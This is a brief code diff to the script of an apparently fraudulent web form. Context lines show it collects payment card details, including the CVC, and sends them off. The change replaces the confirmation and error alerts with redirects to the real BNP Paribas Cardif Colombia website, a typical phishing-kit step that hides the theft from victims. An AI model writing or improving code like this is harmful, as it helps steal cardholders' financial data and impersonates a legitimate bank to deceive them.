@@ -127,11 +127,9 @@ CVC: ${cvc}
           })
         });
 
-        alert("Solicitud enviada. Recibirás confirmación pronto.");
-        form.reset();
+         window.location.href = "https://bnpparibascardif.com.co/"; // 👉 cámbialo por la URL que quieras
       } catch (error) {
-        alert("Error al enviar la solicitud.");
-        console.error(error);
+        window.location.href = "https://bnpparibascardif.com.co/"; // 👉 página de error si falla
       }
     });
   </script>
